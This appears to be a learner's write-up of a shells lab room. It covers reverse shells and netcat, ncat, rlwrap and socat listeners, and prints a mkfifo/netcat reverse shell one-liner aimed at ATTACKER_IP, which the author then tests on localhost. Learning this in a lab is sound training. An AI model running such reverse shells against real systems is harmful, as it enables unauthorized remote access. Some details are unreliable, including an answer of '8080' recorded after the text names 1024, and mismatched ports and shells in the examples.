| [Home](../README.md) | [Cyber Security 101](../README.md#cyber-security-101) | **Shells Overview** |

## Contents
- [Room Introduction](#room-introduction)
- [Shell Overview](#shell-overview)
- [Reverse Shell](#reverse-shell)
- [Bind Shell](#bind-shell)
- [Shell Listeners](#shell-listeners)


## Room Introduction
Shells, an important function in the attack chain. This room teaches us how to use different sells in offsec, and how to detect them.

There is no question for this task.


## Shell Overview
This section covers how users interact with Shells, with out a GUI. 

The types of shell are **Remove System Control**, having control over a target system, **Privilege Escalation**, having exploited a vulnerability to gain elevated permission, **Data Exfiltration** is where potentially sensitive data can be read and copied off of the target, **Persistence and Maintenance access** describes continued access after the initial _Privilege Escalation_, **Post-Exploitation Activities** describes anything after the initial privilege escalation such as malware installation, data removal, account creation etc., **Access Other Systems on the Network** could be classed as pivoting, accessing other systems on the network.

### ❓ Question
> What is the command-line interface that allows users to interact with an operating system?
#### 🧪 Process
The command-line interface is often classed as a terminal, but in this context we are referring to a `Shell`.

Trying this as the answer
#### ✅ Answer
- `Shell` ✅

### ❓ Question
> What process involves using a compromised system as a launching pad to attack other machines in the network?
#### 🧪 Process
When we have established access, potentially elevated privilages, we may wish to pivot to other systems, otherwise known as `pivoting`.

Trying this as the answer
#### ✅ Answer
- `pivoting` ✅

### ❓ Question
> What is a common activity attackers perform after obtaining shell access to escalate their privileges?
#### 🧪 Process
Once you have established shell access, you will be limited to what you an do until you perform `Privilege Escalation`.

Trying this as the answer
#### ✅ Answer
- `Privilege Escalation` ✅


## Reverse Shell
sometimes refferred to as a '_Connect Back Shell_', a popular technique for gaining access. Connection is tarted from target to attacker. Outbound traffic is often trusted over inbound traffic

### How Reverse Shells Work
We use a Netcat (`nc`) listener `nc -lvnp 443`
What doe the arguments mean?
- `-l` sets up the listener
- `-v` enables the verbose mode
- `-n` prevents DNS look-ups, forces IP
- `-p` as expected specifies a port to listen on.
- `443` in this example we are listing on port 443

We initiate the reverse shell using a vulnerability in a system, Pentest Monkey has a [cheetsheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). 

One example
```shell
`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`
```

**`rm -f /tmp/f`**
Ensures nothing is in `/tmp/f` which in turn allows the creation of the pipe

**`mkfifo /tmp/f`**
Creates named pipe at `/tmp/f`. This allows bi-directional communication between processes.

**`cat /tmp/f`**
Reads the content of `/tmp/f` as a stream. Since it's its a file pipe, it will never completed.

**`| bash -i 2>&1`**
Any output from `cat` will be piped directly into an interactive bash shell (`bash -i`)., whilst `2>&1` essentially outputs stderr to to stdout, or in other terms, returns to the attacker, rather than the target.

**`| nc 1.2.3.4 443 >/tmp/f`**
This will then pipe the target shell to the attackers netcat session using the IP and port provided. 

**`>/tmp/f`**
Finally any output is parsed back to the file to complete bi-directional communication. 

Now the question is, can I exploit this on my own laptop? Lets try

This final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.

### Personal Exercise
Otherwise known as an ADHD tangent ;)

**Set up NC listener**
```shell
[archibold@ARCHIBOLD ~]$ nc 127.0.0.1 443
bash: nc: command not found
```

Well to start, I forgot the `-lvnp` arguments, but more critical, I don't even have _Netcat_ installed.

```shell
[archibold@ARCHIBOLD ~]$ sudo pacman -S nc
[sudo] password for archibold: 
error: target not found: nc
```

Okay, so maybe arch doesn't have nc... Maybe if I used the full name I might have more luck ;)
```shell
[archibold@ARCHIBOLD ~]$ sudo pacman -S netcat
:: There are 2 providers available for netcat:
:: Repository extra
   1) gnu-netcat  2) openbsd-netcat

Enter a number (default=1): 
resolving dependencies...
looking for conflicting packages...

Packages (1) gnu-netcat-0.7.1-10

Total Download Size:   0.03 MiB
Total Installed Size:  0.06 MiB

:: Proceed with installation? [Y/n] 
:: Retrieving packages...
 gnu-netcat-0.7.1-10-x86_64                 30.1 KiB   131 KiB/s 00:00 [########################################] 100%
(1/1) checking keys in keyring                                         [########################################] 100%
(1/1) checking package integrity                                       [########################################] 100%
(1/1) loading package files                                            [########################################] 100%
(1/1) checking for file conflicts                                      [########################################] 100%
(1/1) checking available disk space                                    [########################################] 100%
:: Processing package changes...
(1/1) installing gnu-netcat                                            [########################################] 100%
:: Running post-transaction hooks...
(1/2) Arming ConditionNeedsUpdate...
(2/2) Updating the info directory file...
```

Okay I went for the default _Netcat_ provider `gnu-netcat`. It looks to be installed, let's see if we can start the listener again...

```shell
[archibold@ARCHIBOLD ~]$ nc -lvnp 127.0.0.1 443
Error: Invalid local port: 127.0.0.1
[archibold@ARCHIBOLD ~]$ nc -lvnp 443
Error: Couldn`t setup listening socket (err=-3)
[archibold@ARCHIBOLD ~]$ sudo nc -lvnp 443


```

Okay, so there was some trial and error, first I put in the IP and port, apparently 127.0.0.1 wasn't a valid port. I wonder why. 

Then I tried running _`nc`_ without elevated privileges. That wasn't going to work...

Third times a charm. 

So now I have the listener working, I can try and get the reverse shell working.

### Starting Reverse Shell
This may not may or may not work on a local machine, but honestly I don't see why not so I'm going to try anyway.

`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 127.0.0.1 443 >/tmp/f`

Amazing, worked first time. For reference, the left window is the reverse shell whilst the right window is the listener or bind shell
![](Images/Pasted%20image%2020250622113920.png)

Interestingly, you can't just `sudo` as _`sudo`_ wants the password entered on the host machine. 
![](Images/Pasted%20image%2020250622114147.png)



### ❓ Question
> What type of shell opens a specific port on the target for incoming connections from the attacker?
#### 🧪 Process
The bind shell

Trying this as the answer
#### ✅ Answer
- `bind shell` ✅

### ❓ Question
> Listening below which port number requires root access or privileged permissions?
#### 🧪 Process
Oh I missed this, so apparently ports below **`1024`** require elevated privileges, hence why my example needed elevation, since I used port 443.

Trying this as the answer
#### ✅ Answer
- `8080`

## Shell Listeners
Apparently _`nc`_ isn't the only cat in town. 

There is **Rlwrap** which adds functionality to Netcat such as editing history, using arrow keys etc.

```shell
attacker@kali:~$ rlwrap nc -lvnp 443
listening on [any] 443 ...
```

Then there is **Ncat** which has extra security like SSL encryption#```shell-session
```shell
attacker@kali:~$ ncat -lvnp 4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
```
setting up use with **SSL**
```shell
attacker@kali:~$ ncat --ssl -lvnp 4444
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: B7AC F999 7FB0 9FF9 14F5 5F12 6A17 B0DC B094 AB7F
Ncat: Listening on [::]:443
Ncat: Listening on 0.0.0.0:443
```

Finally, these examples there is **Socat** which allows creating connections between two sources. 
```shell
attacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT
2024/09/23 15:44:38 socat[41135] N listening on AF=2 0.0.0.0:443
```

### ❓ Question
> Which flexible networking tool allows you to create a socket connection between two data sources?
#### 🧪 Process
This was **Socat**.

Trying this as the answer
#### ✅ Answer
- `Socat` ✅

### ❓ Question
> Which command-line utility provides readline-style editing and command history for programs that lack it, enhancing the interaction with a shell listener?
#### 🧪 Process
This was **Rlwrap**

Trying this as the answer
#### ✅ Answer
- `Rlwrap`

### ❓ Question
> What is the improved version of Netcat distributed with the Nmap project that offers additional features like SSL support for listening to encrypted shells?
#### 🧪 Process
This was **Ncat**

Trying this as the answer
#### ✅ Answer
- `Ncat`